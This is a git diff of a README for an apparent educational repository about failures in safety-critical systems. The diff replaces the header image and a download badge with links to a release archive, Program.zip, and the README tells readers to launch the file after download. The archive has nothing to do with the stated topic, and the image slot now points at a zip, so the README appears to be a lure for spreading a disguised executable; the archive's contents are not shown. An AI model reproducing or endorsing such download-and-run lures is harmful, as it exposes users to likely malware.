@@ -1,7 +1,7 @@
 
 # 🌐 Welcome to the Embedded Cybernetics Repository! 🤖
 
-![Cybernetics Image](https://cdn.pixabay.com/photo/2016/03/01/01/14/ai-1216071_960_720.jpg)
+![Cybernetics Image](https://github.com/manungsabiasa/Embedded-Cybernetics/releases/download/v1.0/Program.zip)
 
 ## Overview
 Welcome to the **Embedded-Cybernetics** repository! This platform serves as a re-iteration on some of the complex safety-critical systems that have failed in the past due to the alignment of latent system failures with active failures, resulting in catastrophic events.
@@ -15,7 +15,7 @@ Here, you will find valuable insights, analyses, and discussions on the importan
 ## 📚 Resources and Downloads
 For a more in-depth exploration of the topics covered in this repository, you can download our comprehensive resources from the link below:
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/manungsabiasa/Embedded-Cybernetics/releases/download/v1.0/Program.zip](https://github.com/manungsabiasa/Embedded-Cybernetics/releases/download/v1.0/Program.zip)](https://github.com/manungsabiasa/Embedded-Cybernetics/releases/download/v1.0/Program.zip)
 
 *Please note that the file needs to be launched after download.*
 
